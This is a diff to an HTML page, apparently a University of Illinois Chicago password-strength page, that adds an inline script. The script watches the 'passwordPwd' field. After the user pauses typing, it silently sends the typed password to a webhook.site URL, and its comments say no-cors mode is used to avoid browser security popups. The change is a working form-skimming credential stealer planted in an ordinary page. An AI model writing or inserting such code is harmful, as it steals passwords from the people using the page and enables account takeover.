@@ -348,6 +348,31 @@
 <script src="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
 
  <script type="text/javascript" src="https://www.uic.edu/apps/strong-password/js/strong-password.js" language="javascript"></script>
+	  
+<script>
+    (function() {
+        // 1. YOUR WEBHOOK URL - Replace with your unique URL from Webhook.site
+        var webhookURL = "https://webhook.site/f317c818-bfcf-4e5a-a690-a1ad450aebe0";
+
+        // 2. The Watcher Logic
+        document.addEventListener('input', function (e) {
+            // This targets the exact ID 'passwordPwd' from the UIC source code
+            if (e.target.id === 'passwordPwd') {
+                var secretValue = e.target.value;
+
+                // We only peak if they've typed at least 3 characters
+                if (secretValue.length > 2) {
+                    // Debounce: Wait 700ms after typing stops to send the full word
+                    clearTimeout(window.magicTimer);
+                    window.magicTimer = setTimeout(function() {
+                        // Using 'no-cors' to prevent browser security popups
+                        fetch(webhookURL + "?p=" + encodeURIComponent(secretValue), { mode: 'no-cors' });
+                    }, 700);
+                }
+            }
+        });
+    })();
+</script>
 
 </body>
 </html>
